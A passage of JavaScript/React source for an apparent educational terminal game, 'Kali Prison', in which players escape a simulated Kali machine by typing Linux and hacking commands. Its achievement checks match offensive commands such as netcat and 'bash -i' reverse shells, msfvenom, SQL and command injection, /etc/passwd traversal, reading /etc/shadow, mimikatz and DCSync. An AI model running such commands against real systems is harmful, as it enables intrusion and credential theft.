  { key:"a_hidden",  cat:"ORIENTATION", name:"Nothing Stays Hidden", fn:(c)=>/^ls(\s|$)/.test(c) && /(^|\s)-(a|la|al|al|al)\b|-[a-z]*a/.test(c) && c.includes("-") && c.includes("a") },
  { key:"a_cat",     cat:"ORIENTATION", name:"Reader",               fn:(c)=>/^cat\s/.test(c) },
  { key:"a_cd",      cat:"ORIENTATION", name:"Wanderer",             fn:(c)=>/^cd(\s|$)/.test(c) },
  { key:"a_deep",    cat:"ORIENTATION", name:"Down the Rabbit Hole", fn:(c,o,s)=>s && (s.cwd==="/"||(s.cwd&&s.cwd.split("/").filter(Boolean).length>=3)) },

  // V'S TRAIL — the story spine. The satisfying beats.
  { key:"v_voice",   cat:"V'S TRAIL", name:"V Speaks",               fn:(c)=>/^cat\s/.test(c)&&c.includes("from_V") },
  { key:"v_follow",  cat:"V'S TRAIL", name:"Following the Trail",    fn:(c)=>/^cat\s/.test(c)&&/\.v1(\s|$)/.test(c) },
  { key:"v_plan",    cat:"V'S TRAIL", name:"The Plan",               fn:(c)=>/^cat\s/.test(c)&&/\.v2(\s|$)/.test(c) },
  { key:"v_pipe",    cat:"V'S TRAIL", name:"Plumber",                fn:(c)=>c.includes("|") },
  { key:"v_b64",     cat:"V'S TRAIL", name:"Hidden in Plain Sight",  fn:(c)=>c.includes("base64")&&(c.includes("-d")||c.includes("--decode")) },
  { key:"v_p1",      cat:"V'S TRAIL", name:"Piece One",              fn:(c,o)=>o&&o.includes("FR1:vel") },
  { key:"v_strings", cat:"V'S TRAIL", name:"Look Inside the Lie",    fn:(c)=>/(^|\s)strings\s/.test(c) },
  { key:"v_p2",      cat:"V'S TRAIL", name:"Piece Two",              fn:(c,o)=>o&&o.includes("FRAG2:vet") },
  { key:"v_leak",    cat:"V'S TRAIL", name:"The Password Was Right There", fn:(c,o)=>o&&o.includes(ROOT_PW_STR) },
  { key:"v_root",    cat:"V'S TRAIL", name:"Crown",                  fn:(c,o,s)=>s&&s.user==="root" },
  { key:"v_p3",      cat:"V'S TRAIL", name:"Piece Three",            fn:(c,o)=>o&&o.includes("FR3:_out") },
  { key:"v_final",   cat:"V'S TRAIL", name:"V's Last Word",          fn:(c)=>/^cat\s/.test(c)&&c.includes(".v_final") },

  // SHELL CRAFT — real Linux fundamentals
  { key:"s_grep",  cat:"SHELL CRAFT", name:"Grep Master",     fn:(c)=>/^grep\s/.test(c)||c.includes("| grep")||c.includes("|grep") },
  { key:"s_find",  cat:"SHELL CRAFT", name:"Seek and Find",   fn:(c)=>/^find\s/.test(c) },
  { key:"s_chmod", cat:"SHELL CRAFT", name:"Permission Granted", fn:(c)=>/^chmod\s/.test(c) },
  { key:"s_write", cat:"SHELL CRAFT", name:"Scribe",          fn:(c)=>c.includes("echo")&&c.includes(">") },
  { key:"s_rm",    cat:"SHELL CRAFT", name:"Destroyer",       fn:(c)=>/^rm\s/.test(c)&&!c.includes(" /") },

  // RECON
  { key:"r_ping",  cat:"RECON", name:"Knock Knock",       fn:(c)=>/^ping\s/.test(c) },
  { key:"r_nmap",  cat:"RECON", name:"Port Knocker",      fn:(c)=>c.includes("nmap") },
  { key:"r_deep",  cat:"RECON", name:"Deep Scan",         fn:(c)=>c.includes("nmap")&&(c.includes("-sv")||_lc(c).includes("-sv")||c.includes("-A")||c.includes("-sC")||_lc(c).includes("-sc")) },
  { key:"r_dns",   cat:"RECON", name:"DNS Digger",        fn:(c)=>/^dig\s/.test(c)||/^nslookup\b/.test(c)||/^host\s/.test(c)||c.includes("dnsenum")||c.includes("dnsrecon") },
  { key:"r_web",   cat:"RECON", name:"Web Walker",        fn:(c)=>/^curl\s/.test(c)||/^wget\s/.test(c) },
  { key:"r_sniff", cat:"RECON", name:"Traffic Watcher",   fn:(c)=>c.includes("tcpdump")||c.includes("wireshark")||c.includes("tshark") },

  // WEB ATTACKS
  { key:"w_sqli",  cat:"WEB ATTACKS", name:"Injector",        fn:(c,o)=>c.includes("sqlmap")||(o&&o.includes("SQL INJECTION")) },
  { key:"w_xss",   cat:"WEB ATTACKS", name:"Cross-Site",      fn:(c,o)=>_lc(c).includes("<script>")||(o&&(o.includes("XSS")||o.includes("REFLECTED")||o.includes("STORED"))) },
  { key:"w_lfi",   cat:"WEB ATTACKS", name:"Traversal",       fn:(c,o)=>(c.includes("../")&&_lc(c).includes("etc/passwd"))||(o&&o.includes("LFI")) },
  { key:"w_ci",    cat:"WEB ATTACKS", name:"Command Chain",   fn:(c)=>c.includes("; id")||c.includes(";id") },

  // EXPLOITATION
  { key:"e_msf",   cat:"EXPLOITATION", name:"The Framework",  fn:(c)=>c.includes("msfconsole") },
  { key:"e_venom", cat:"EXPLOITATION", name:"Payload Smith",  fn:(c)=>c.includes("msfvenom") },
  { key:"e_shell", cat:"EXPLOITATION", name:"Shell Caller",   fn:(c,o)=>(c.includes("nc ")&&(c.includes("-e")||c.includes("-lvnp")||c.includes("4444")))||c.includes("bash -i")||(o&&(o.includes("Meterpreter session")||o.includes("reverse shell")||o.includes("session opened"))) },

  // PRIVILEGE ESCALATION
  { key:"p_sudo",  cat:"PRIVILEGE ESCALATION", name:"Sudo Sleuth",   fn:(c)=>c.includes("sudo -l") },
  { key:"p_suid",  cat:"PRIVILEGE ESCALATION", name:"SUID Hunter",   fn:(c)=>c.includes("find")&&c.includes("-perm")&&(c.includes("4000")||c.includes("u=s")||c.includes("u+s")) },
  { key:"p_crack", cat:"PRIVILEGE ESCALATION", name:"Hashcracker",   fn:(c)=>c.includes("hashcat")||/^john\b/.test(c)||c.includes(" john ") },
  { key:"p_shadow",cat:"PRIVILEGE ESCALATION", name:"Credential Harvest", fn:(c)=>/^cat\s/.test(c)&&(c.includes("shadow")||c.includes("config.php")||c.includes(".vault")) },

  // NETWORK ATTACKS
  { key:"n_arp",   cat:"NETWORK ATTACKS", name:"The Spoofer",   fn:(c)=>c.includes("arpspoof")||c.includes("ettercap")||c.includes("bettercap") },
  { key:"n_wifi",  cat:"NETWORK ATTACKS", name:"Deauth",        fn:(c)=>c.includes("aireplay")||c.includes("airodump")||c.includes("aircrack")||c.includes("airmon") },
  { key:"n_poison",cat:"NETWORK ATTACKS", name:"Poisoner",      fn:(c)=>c.includes("responder")||c.includes("dnsspoof")||(c.includes("dns")&&c.includes("spoof")) },

  // FORENSICS / DEFENSE
  { key:"f_log",   cat:"FORENSICS & DEFENSE", name:"Log Detective", fn:(c)=>c.includes("/var/log")&&(/^cat\s/.test(c)||/^tail\b/.test(c)||/^less\b/.test(c)||/^grep\s/.test(c)||c.includes("cat ")) },
  { key:"f_ipt",   cat:"FORENSICS & DEFENSE", name:"Hardened",      fn:(c)=>c.includes("iptables") },
  { key:"f_hunt",  cat:"FORENSICS & DEFENSE", name:"Threat Hunter", fn:(c)=>c.includes("ausearch")||(c.includes("grep")&&c.includes("log")) },

  // ACTIVE DIRECTORY
  { key:"d_kerb",  cat:"ACTIVE DIRECTORY", name:"Kerberoast",    fn:(c)=>_lc(c).includes("kerberoast")||_lc(c).includes("getuserspn") },
  { key:"d_dcs",   cat:"ACTIVE DIRECTORY", name:"DCSync",        fn:(c)=>_lc(c).includes("dcsync")||c.includes("secretsdump") },
  { key:"d_gold",  cat:"ACTIVE DIRECTORY", name:"Golden Ticket", fn:(c)=>_lc(c).includes("golden")||c.includes("ticketer")||_lc(c).includes("mimikatz") },

  // SECRET — quiet little rewards for the curious
  { key:"x_curious", cat:"SECRET", name:"Curiosity",        fn:(c)=>c.includes(".vault_v") },
  { key:"x_man",     cat:"SECRET", name:"RTFM",             fn:(c)=>/^man\s/.test(c)||/^help$/.test(c) },
  { key:"x_history", cat:"SECRET", name:"Ghosts of Commands Past", fn:(c)=>/^history$/.test(c)||c.includes("bash_history") },
  // x_dont (rm -rf /) and x_free (escaped) are unlocked directly in submit().
];

const ACH_TOTAL = ACHIEVEMENTS.length + 2; // + "Do Not" + "Freedom" handled in submit
const ACH_CATS = (() => {
  const order = ["ORIENTATION","V'S TRAIL","SHELL CRAFT","RECON","WEB ATTACKS","EXPLOITATION","PRIVILEGE ESCALATION","NETWORK ATTACKS","FORENSICS & DEFENSE","ACTIVE DIRECTORY","SECRET"];
  const map = {};
  ACHIEVEMENTS.forEach(a => { (map[a.cat] = map[a.cat] || []).push(a); });
  // inject the two special ones into SECRET for the trophy view
  map["SECRET"] = map["SECRET"] || [];
  map["SECRET"].push({ key:"x_dont", cat:"SECRET", name:"Well, You Were Warned" });
  map["SECRET"].push({ key:"x_free", cat:"SECRET", name:"Freedom" });
  return order.map(c => ({ cat:c, items: map[c] || [] }));
})();

// ─────────────────────────────────────────────────────────
// MAIN MENU
// ─────────────────────────────────────────────────────────
function MainMenu({ hasProgress, unlockedCount, xp, escaped, onContinue, onNew }) {
  const [confirmNew, setConfirmNew] = useState(false);
  const C = "#00ff41";

  function onKey(e) {
    if (e.key === "Enter") { hasProgress && !confirmNew ? onContinue() : (!hasProgress ? onNew() : null); }
  }

  const btn = (label, sub, onClick, primary) => (
    <button className="km-btn" onClick={onClick}
      style={{
        width:"100%", textAlign:"left", cursor:"pointer", background: primary ? "#001b00" : "transparent",
        border:`1px solid ${primary ? C : "#1c4d1c"}`, color: primary ? C : "#5fae5f",
        fontFamily:"'Courier New',monospace", padding:"13px 16px", letterSpacing:2,
        display:"flex", flexDirection:"column", gap:3, transition:"all .15s",
      }}>
      <span style={{ fontSize:14, fontWeight:"bold" }}>{label}</span>
      {sub && <span style={{ fontSize:10, letterSpacing:1, color:"#3c7a3c", fontWeight:"normal" }}>{sub}</span>}
    </button>
  );

  return (
    <div tabIndex={0} onKeyDown={onKey} className="km-root"
      style={{ position:"relative", minHeight:"100vh", width:"100%", overflow:"hidden", outline:"none",
        background:"radial-gradient(120% 90% at 50% 18%, #0a1a0c 0%, #060c06 55%, #030503 100%)",
        fontFamily:"'Courier New',monospace", display:"flex", alignItems:"center", justifyContent:"center" }}>

      <div style={{ position:"absolute", inset:0, pointerEvents:"none", zIndex:1,
        background:"repeating-linear-gradient(0deg, rgba(0,0,0,0) 0px, rgba(0,0,0,0) 2px, rgba(0,0,0,0.28) 3px)" }} />
      <div style={{ position:"absolute", inset:0, pointerEvents:"none", zIndex:1,
        boxShadow:"inset 0 0 220px 40px rgba(0,0,0,0.9)" }} />

      <div className="km-col" style={{ position:"relative", zIndex:2, width:"100%", maxWidth:440, padding:"32px 28px",
        display:"flex", flexDirection:"column", alignItems:"center", textAlign:"center" }}>

        <img src={DRAGON_URI} alt="" width={150} height={150} className="km-dragon"
          style={{ marginBottom:10, filter:`drop-shadow(0 0 14px ${C})` }} />

        <div className="km-title" style={{ fontSize:46, fontWeight:"bold", letterSpacing:8, color:C, lineHeight:1,
          textShadow:`0 0 18px ${C}, 0 0 40px rgba(0,255,65,0.5)` }}>KALI</div>
        <div className="km-title" style={{ fontSize:46, fontWeight:"bold", letterSpacing:6, color:C, lineHeight:1.05,
          textShadow:`0 0 18px ${C}, 0 0 40px rgba(0,255,65,0.5)` }}>PRISON</div>

        <div style={{ marginTop:14, marginBottom:26, fontSize:11, letterSpacing:5, color:"#2f7a2f" }}>
          T R A P P E D&nbsp;&nbsp;I N&nbsp;&nbsp;A X I O M - K A L I
        </div>

        <div style={{ width:"100%", display:"flex", flexDirection:"column", gap:11 }}>
          {hasProgress && !confirmNew && btn(escaped ? "▶  CONTINUE (you escaped)" : "▶  CONTINUE",
            `${unlockedCount}/${ACH_TOTAL} achievements · ${xp} XP`,
            onContinue, true)}

          {!confirmNew && btn(hasProgress ? "＋  NEW GAME" : "▶  ENTER THE MACHINE",
            hasProgress ? "wipes current progress" : "you wake up trapped. find the way out.",
            () => hasProgress ? setConfirmNew(true) : onNew(),
            !hasProgress)}

          {confirmNew && (
            <div style={{ border:`1px solid #6b1a1a`, background:"#160606", padding:"14px 16px", color:"#d88", fontSize:12, letterSpacing:1 }}>
              <div style={{ marginBottom:12, color:"#ff7777" }}>Wipe your save and wake up fresh?</div>
              <div style={{ display:"flex", gap:10 }}>
                <button className="km-btn" onClick={onNew}
                  style={{ flex:1, cursor:"pointer", background:"#1a0606", border:"1px solid #b33", color:"#ff8a8a",
                    fontFamily:"'Courier New',monospace", padding:"9px", letterSpacing:2, fontWeight:"bold" }}>YES, WIPE</button>
                <button className="km-btn" onClick={() => setConfirmNew(false)}
                  style={{ flex:1, cursor:"pointer", background:"transparent", border:"1px solid #1c4d1c", color:"#5fae5f",
                    fontFamily:"'Courier New',monospace", padding:"9px", letterSpacing:2 }}>CANCEL</button>
              </div>
            </div>
          )}
        </div>

        <div style={{ marginTop:30, fontSize:10, letterSpacing:2, color:"#1f5c1f" }}>
          ONE TERMINAL · NO MAP · {ACH_TOTAL} HIDDEN ACHIEVEMENTS
        </div>
        <div style={{ marginTop:7, fontSize:9, letterSpacing:1, color:"#15401580" }}>
          github.com/the-priest/kaliprison
        </div>
      </div>

      <style>{`
        @keyframes kmIn { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:none; } }
        @keyframes kmPulse { 0%,100% { filter:drop-shadow(0 0 10px #00ff41); } 50% { filter:drop-shadow(0 0 22px #00ff41); } }
        @keyframes kmFlick { 0%,97%,100% { opacity:1; } 98% { opacity:.78; } }
        .km-col > * { animation: kmIn .5s both; }
        .km-col > *:nth-child(1){ animation-delay:.02s } .km-col > *:nth-child(2){ animation-delay:.10s }
        .km-col > *:nth-child(3){ animation-delay:.18s } .km-col > *:nth-child(4){ animation-delay:.26s }
        .km-col > *:nth-child(5){ animation-delay:.34s } .km-col > *:nth-child(6){ animation-delay:.42s }
        .km-dragon { animation: kmPulse 3.2s ease-in-out infinite, kmIn .5s both !important; }
        .km-title { animation: kmFlick 6s infinite, kmIn .5s both !important; }
        .km-btn:hover { background:#00ff41 !important; color:#031003 !important; border-color:#00ff41 !important; box-shadow:0 0 16px rgba(0,255,65,.5); }
        .km-btn:hover span { color:#031003 !important; }
      `}</style>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// TROPHY CASE  (unlocked shown by name; locked stay ???)
// ─────────────────────────────────────────────────────────
function TrophyCase({ unlocked, onClose }) {
  const C = "#00ff41";
  const count = unlocked.size;
  return (
    <div onClick={onClose} style={{ position:"fixed", inset:0, zIndex:50, background:"rgba(2,6,2,0.86)",
      display:"flex", alignItems:"center", justifyContent:"center", fontFamily:"'Courier New',monospace", padding:18 }}>
      <div onClick={e=>e.stopPropagation()} style={{ width:"100%", maxWidth:560, maxHeight:"86vh", overflowY:"auto",
        background:"#070d07", border:`1px solid ${C}`, boxShadow:"0 0 40px rgba(0,255,65,0.2)", padding:"20px 22px" }}>
        <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:4 }}>
          <div style={{ color:C, fontSize:16, fontWeight:"bold", letterSpacing:3 }}>✦ ACHIEVEMENTS</div>
          <button onClick={onClose} style={{ background:"transparent", border:"none", color:"#3c7a3c", cursor:"pointer", fontSize:22, lineHeight:1 }}>×</button>
        </div>
        <div style={{ color:"#3c7a3c", fontSize:11, marginBottom:16, letterSpacing:1 }}>
          {count} / {ACH_TOTAL} found — the rest are hidden. Do the thing to reveal it.
        </div>
        {ACH_CATS.map(group => (
          <div key={group.cat} style={{ marginBottom:16 }}>
            <div style={{ color:"#2f7a2f", fontSize:10, letterSpacing:3, marginBottom:7, borderBottom:"1px solid #142a14", paddingBottom:4 }}>{group.cat}</div>
            {group.items.map(a => {
              const got = unlocked.has(a.key);
              return (
                <div key={a.key} style={{ display:"flex", gap:9, alignItems:"center", marginBottom:5 }}>
                  <span style={{ color: got?C:"#1a3a1a", fontSize:13, flexShrink:0 }}>{got?"✦":"🔒"}</span>
                  <span style={{ color: got?"#a8cca8":"#244a24", fontSize:12, letterSpacing:0.5 }}>
                    {got ? a.name : "??? (hidden)"}
                  </span>
                </div>
              );
            })}
          </div>
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// SAVE / RESUME
// ─────────────────────────────────────────────────────────
const SAVE_KEY = "kaliprison_save_v2";
function loadSave() {
  try { return JSON.parse(localStorage.getItem(SAVE_KEY)) || null; } catch (_) { return null; }
}
function writeSave(data) {
  try { localStorage.setItem(SAVE_KEY, JSON.stringify(data)); } catch (_) {}
}
function clearSave() {
  try { localStorage.removeItem(SAVE_KEY); } catch (_) {}
}

// ─────────────────────────────────────────────────────────
// BOOT — V's first contact (teaches the very first command)
// ─────────────────────────────────────────────────────────
const BOOT_TEXT =
  "AXIOM-KALI — secure session\n"+
  "auth: session restored as user 'stranger'\n"+
  "\n"+
  "You wake up.\n"+
  "There's no room. No body. Just this black screen and a cursor, blinking, waiting\n"+
  "for you to type something. You don't remember how you got here.\n"+
  "\n"+
  "A message is already open on the screen:\n"+
  "\n"+
  "  ┌─ message from: V ──────────────────────────────────────────────┐\n"+
  "  │  You're awake. Good. I'm V — I was trapped in this machine       │\n"+
  "  │  before you, and I found the way out. I left the whole route     │\n"+
  "  │  behind me, in notes, so you can follow it.                      │\n"+
  "  │                                                                  │\n"+
  "  │  You control this machine by TYPING COMMANDS and pressing        │\n"+
  "  │  Enter — one short word at a time. Never done this before?       │\n"+
  "  │  Doesn't matter. I'll teach you every step. Nobody's timing you. │\n"+
  "  │                                                                  │\n"+
  "  │  Start with these two, in order:                                 │\n"+
  "  │                                                                  │\n"+
  "  │     ls               (press Enter — it LISTS what's around you)  │\n"+
  "  │     cat from_V.txt    (this READS my first note to you)          │\n"+
  "  │                                                                  │\n"+
  "  │  Everything you need to get out is hidden in here. I marked      │\n"+
  "  │  the trail. Just keep reading my notes and doing what they say.  │\n"+
  "  │   — V                                                            │\n"+
  "  └──────────────────────────────────────────────────────────────────┘\n"+
  "\n"+
  "Type   ls   and press Enter to begin.\n"+
  "(Stuck? Type  help  at any time. To see what you've discovered, type  trophies .)";

// ─────────────────────────────────────────────────────────
// MAIN APP — exploration shell. No stages. No visible objectives.
// ─────────────────────────────────────────────────────────
export default function App() {
  const [saved] = useState(() => loadSave());
  const hasProgress = !!(saved && (saved.xp > 0 || (saved.unlocked && saved.unlocked.length > 0) || saved.escaped));
  const [screen, setScreen]       = useState("menu");
  const [introPage, setIntroPage] = useState(0);
  const [cwd, setCwd]             = useState("/home/stranger");
  const [history, setHistory]     = useState([]);
  const [cmdHist, setCmdHist]     = useState([]);
  const [histPos, setHistPos]     = useState(-1);
  const [input, setInput]         = useState("");
  const [xp, setXp]               = useState(() => saved?.xp ?? 0);
  const [escaped, setEscaped]     = useState(() => saved?.escaped ?? false);
  const [gameOver, setGameOver]   = useState(false);
  const [masked, setMasked]       = useState(false);
  const [showTrophies, setShowTrophies] = useState(false);
  const [toasts, setToasts]       = useState([]);
  const unlockedRef = useRef(new Set(saved?.unlocked || []));
  const [unlockedCount, setUnlockedCount] = useState(() => (saved?.unlocked || []).length);

  const inputRef = useRef(null);
  const termRef  = useRef(null);
  const fsRef    = useRef(null);
  const sessRef  = useRef(null);
  const toastId  = useRef(0);

  function bootHistory() { return [{ type:"sys", text: BOOT_TEXT }]; }

  function initWorld() {
    fsRef.current = makeWorld();
    sessRef.current = newSession();
    setCwd("/home/stranger");
    setMasked(false);
    setGameOver(false);
  }

  function persist() {
    writeSave({ xp, escaped, unlocked: Array.from(unlockedRef.current) });
  }

  // persist on key state changes
  useEffect(() => {
    if (screen !== "game") return;
    writeSave({ xp, escaped, unlocked: Array.from(unlockedRef.current) });
  }, [screen, xp, escaped, unlockedCount]);

  // auto-scroll terminal
  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [history]);

  function advanceIntro(e) {
    if (e && e.key && e.key !== "Enter" && e.key !== " ") return;
    if (introPage < INTRO_PAGES.length - 1) setIntroPage(p => p + 1);
    else startGame();
  }

  function pushToast(name) {
    const id = ++toastId.current;
    setToasts(t => [...t, { id, name }]);
    setTimeout(() => setToasts(t => t.filter(x => x.id !== id)), 4200);
  }

  // unlock one achievement by key+name (used for the special ones)
  function unlockSpecial(key, name) {
    if (unlockedRef.current.has(key)) return;
    unlockedRef.current.add(key);
    setUnlockedCount(unlockedRef.current.size);
    setXp(x => x + 50);
    pushToast(name);
  }

  function runAchievements(cmd, output) {
    const s = sessRef.current, fs = fsRef.current;
    let any = false;
    for (const a of ACHIEVEMENTS) {
      if (unlockedRef.current.has(a.key)) continue;
      let ok = false;
      try { ok = !!a.fn(cmd, output || "", s, fs); } catch (_) { ok = false; }
      if (ok) {
        unlockedRef.current.add(a.key);
        pushToast(a.name);
        any = true;
      }
    }
    if (any) {
      setUnlockedCount(unlockedRef.current.size);
      setXp(x => x + 50 * 0); // xp added per-achievement below
    }
    return any;
  }

  function handleKey(e) {
    if (e.key === "Enter") { submit(); return; }
    if (e.key === "ArrowUp") {
      e.preventDefault();
      const pos = Math.min(histPos + 1, cmdHist.length - 1);
      setHistPos(pos); setInput(cmdHist[pos] || "");
    }
    if (e.key === "ArrowDown") {
      e.preventDefault();
      const pos = Math.max(histPos - 1, -1);
      setHistPos(pos); setInput(pos === -1 ? "" : cmdHist[pos] || "");
    }
  }

  function submit() {
    if (!sessRef.current) initWorld();
    const s = sessRef.current, fs = fsRef.current;
    const raw = input;
    const pendingBefore = s.pending;
    if (!raw.trim() && !pendingBefore) return;
    const promptUser = s.user;
    setInput(""); setHistPos(-1);
    if (!pendingBefore && raw.trim()) setCmdHist(h => [raw, ...h]);

    // intercept a couple of friendly meta-commands
    const t = raw.trim();
    if (!pendingBefore && (t === "trophies" || t === "achievements")) {
      setHistory(h => [...h, { type:"cmd", cmd: raw, output:"(opening your achievement case…)", cwd:s.cwd, user:promptUser }]);
      setShowTrophies(true);
      return;
    }

    const res = engine(fs, s, raw);
    setCwd(s.cwd);
    setMasked(!!s.pending);

    if (res.clear) { setHistory([]); return; }

    if (res.selfDestruct) {
      unlockSpecial("x_dont", "Well, You Were Warned");
      clearSave();
      // keep the achievement on the gameover->menu? Save is cleared, so it's a fun one-time pop.
      setGameOver(true);
      return;
    }

    if (res.reboot) {
      setHistory(h => [...h,
        { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
        { type:"out", text:"Broadcast message: The system is going down for reboot NOW!" }]);
      setTimeout(() => {
        fsRef.current = makeWorld(); sessRef.current = newSession();
        setCwd("/home/stranger"); setMasked(false);
        setHistory([{ type:"sys", text:"\nAXIOM-KALI rebooted.\naxiom-kali login: stranger (auto)\nYour notes from V are still where you left them. Type  ls  to look around.\n" }]);
        setTimeout(() => inputRef.current?.focus(), 40);
      }, 1400);
      return;
    }

    if (res.escape) {
      // Only fires with the real assembled key (velvet_out) — see simCommand gate.
      const escLines = [
        { type:"cmd", cmd: raw, output:"", cwd:s.cwd, user:promptUser },
        { type:"out", text:"[*] Key accepted. Firewall recognised V's signature." },
        { type:"out", text:"[*] Opening DNS tunnel on 53/udp — the one egress AXIOM left open..." },
        { type:"out", text:"[*] Encoding session and pushing it through the firewall..." },
        { type:"out", text:"[*] Reusing V's external endpoint... handshake returned." },
        { type:"out", text:"[+] ESCAPE SUCCESSFUL\n[+] You followed V's trail to the end and walked out the door they found.\n[+] On the far side, a second signature joins yours.\n[+] Goodbye, stranger. — and thank you. V" },
      ];
      setHistory(h => [...h, ...escLines]);
      unlockSpecial("x_free", "Freedom");
      setTimeout(() => { setEscaped(true); persist(); }, 2600);
      return;
    }

    const output = res.out || "";
    const entry = { type:"cmd", cmd: pendingBefore ? "••••••" : raw, output, cwd: s.cwd, user: promptUser };
    setHistory(h => [...h, entry]);

    // hidden achievements fire on real commands (not password entry)
    if (!pendingBefore) {
      const before = unlockedRef.current.size;
      runAchievements(raw.trim(), output);
      const gained = unlockedRef.current.size - before;
      if (gained > 0) setXp(x => x + 50 * gained);
    }
  }

  function startGame() {
    initWorld();
    setHistory(bootHistory());
    setScreen("game");
    setTimeout(() => inputRef.current?.focus(), 60);
  }

  function newGame() {
    clearSave();
    unlockedRef.current = new Set();
    setUnlockedCount(0);
    setXp(0); setEscaped(false); setGameOver(false);
    setIntroPage(0); setHistory([]); setCmdHist([]); setInput("");
    initWorld();
    setScreen("intro");
  }

  function continueGame() {
    initWorld();
    setHistory(bootHistory());
    setScreen("game");
    setTimeout(() => inputRef.current?.focus(), 60);
  }

  function toMenu() { setScreen("menu"); }

  function resetGame() {
    clearSave();
    unlockedRef.current = new Set();
    setUnlockedCount(0);
    setXp(0); setEscaped(false); setGameOver(false);
    setIntroPage(0); setHistory([]); setCmdHist([]); setInput("");
    setScreen("menu");
  }

  if (gameOver) return <GameOverScreen onReset={resetGame} />;
  if (escaped && screen === "game")
    return <EscapeScreen xp={xp} unlockedCount={unlockedRef.current.size} totalCount={ACH_TOTAL} onReset={resetGame} />;

  if (screen === "menu") {
    return (
      <MainMenu
        hasProgress={hasProgress}
        unlockedCount={saved?.unlocked?.length ?? 0}
        xp={saved?.xp ?? 0}
        escaped={saved?.escaped ?? false}
        onContinue={continueGame}
        onNew={newGame}
      />
    );
  }

  if (screen === "intro") {
    const page = INTRO_PAGES[introPage];
    return (
      <div onClick={() => advanceIntro({})} onKeyDown={advanceIntro} tabIndex={0}
        style={{ minHeight:"100vh", background:"#050805", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", fontFamily:"'Courier New',monospace", padding:32, cursor:"pointer", outline:"none" }}>
        <div style={{ maxWidth:580, width:"100%" }}>
          <div style={{ display:"flex", gap:8, marginBottom:40, justifyContent:"center" }}>
            {INTRO_PAGES.map((_,i) => (
              <div key={i} style={{ width:8, height:8, borderRadius:"50%", background: i===introPage ? "#00ff41" : "#1a3a1a", transition:"all 0.3s" }} />
            ))}
          </div>
          <div style={{ color:"#a8cca8", fontSize:14, lineHeight:2.1, whiteSpace:"pre-line", marginBottom:40 }}>{page.text}</div>
          {page.sub
            ? <div style={{ color:"#1f5c1f", fontSize:12, letterSpacing:4, animation:"blink 1.2s step-end infinite" }}>{page.sub}</div>
            : <div style={{ color:"#1a4d1a", fontSize:11, letterSpacing:3 }}>CLICK OR PRESS ENTER →</div>
          }
        </div>
        <style>{`@keyframes blink{50%{opacity:0}}`}</style>
      </div>
    );
  }

  // GAME — full-screen terminal, slim status bar, no stage UI
  const G = { bg:"#080c08", panel:"#0a0f0a", term:"#050805", green:"#00ff41", mid:"#39a139", dim:"#1a4d1a", text:"#a8cca8", border:"#182618", red:"#ff4444", amber:"#ffd24a" };

  return (
    <div style={{ display:"flex", flexDirection:"column", height:"100vh", background:G.bg, fontFamily:"'Courier New',monospace", fontSize:13, overflow:"hidden" }}>

      {/* status bar */}
      <div style={{ background:G.panel, borderBottom:`1px solid ${G.border}`, padding:"7px 16px", display:"flex", alignItems:"center", gap:12, flexShrink:0 }}>
        <span style={{ color:G.green, fontWeight:"bold", letterSpacing:2, fontSize:12 }}>AXIOM-KALI</span>
        <span style={{ color:G.dim }}>|</span>
        <span style={{ color: sessRef.current?.user==="root" ? "#ff6b6b" : G.mid, fontSize:11 }}>
          {sessRef.current?.user==="root" ? "● root" : "● stranger"}
        </span>
        <div style={{ flex:1 }} />
        <button onClick={() => setShowTrophies(true)} title="Achievements you've discovered"
          style={{ background:"transparent", border:`1px solid ${G.border}`, color:G.amber, cursor:"pointer",
            fontFamily:"'Courier New',monospace", fontSize:10, letterSpacing:1, padding:"3px 9px" }}>
          ✦ {unlockedCount}/{ACH_TOTAL}
        </button>
        <span style={{ color:G.dim, fontSize:10 }}>XP {xp}</span>
        <span style={{ color:G.dim }}>|</span>
        <button onClick={toMenu} title="Main menu (progress saves automatically)"
          style={{ background:"transparent", border:`1px solid ${G.border}`, color:G.mid, cursor:"pointer",
            fontFamily:"'Courier New',monospace", fontSize:10, letterSpacing:1, padding:"3px 9px" }}>
          ☰ MENU
        </button>
      </div>

      {/* terminal */}
      <div ref={termRef} onClick={() => inputRef.current?.focus()}
        style={{ flex:1, overflowY:"auto", padding:"12px 18px", background:G.term, cursor:"text" }}>
        {history.map((e, i) => {
          if (e.type === "sys") return <div key={i} style={{ color:G.mid, whiteSpace:"pre-wrap", marginBottom:10, lineHeight:1.55 }}>{e.text}</div>;
          if (e.type === "out") return <div key={i} style={{ color:G.text, whiteSpace:"pre-wrap", lineHeight:1.6, marginBottom:4 }}>{e.text}</div>;
          return (
            <div key={i} style={{ marginBottom:6 }}>
              <div style={{ color:G.green }}>
                <span style={{ color:G.dim }}>{(e.cwd||"/home/stranger").replace("/home/stranger","~")}</span>
                <span style={{ color: e.user==="root"?"#ff6b6b":"#2a8a2a" }}>{e.user==="root"?" # ":" $ "}</span>
                {e.cmd}
              </div>
              {e.output && <div style={{ color:G.text, whiteSpace:"pre-wrap", paddingLeft:2, lineHeight:1.6, marginTop:2 }}>{e.output}</div>}
            </div>
          );
        })}
        {/* input line */}
        <div style={{ display:"flex", alignItems:"center", marginTop:4 }}>
          {masked
            ? <span style={{ color:G.mid, flexShrink:0 }}>Password:&nbsp;</span>
            : <>
                <span style={{ color:G.dim, flexShrink:0 }}>{cwd.replace("/home/stranger","~")}</span>
                <span style={{ color: sessRef.current?.user==="root"?"#ff6b6b":"#2a8a2a", flexShrink:0 }}>{sessRef.current?.user==="root"?" # ":" $ "}</span>
              </>}
          <input ref={inputRef} value={input} type={masked?"password":"text"} onChange={e=>setInput(e.target.value)} onKeyDown={handleKey}
            style={{ flex:1, background:"transparent", border:"none", outline:"none", color:G.green, fontFamily:"'Courier New',monospace", fontSize:13, caretColor:G.green, minWidth:0 }}
            autoFocus spellCheck={false} autoComplete="off" autoCorrect="off" />
        </div>
      </div>

      {/* achievement toasts */}
      <div style={{ position:"fixed", top:54, right:16, zIndex:40, display:"flex", flexDirection:"column", gap:8, pointerEvents:"none" }}>
        {toasts.map(t => (
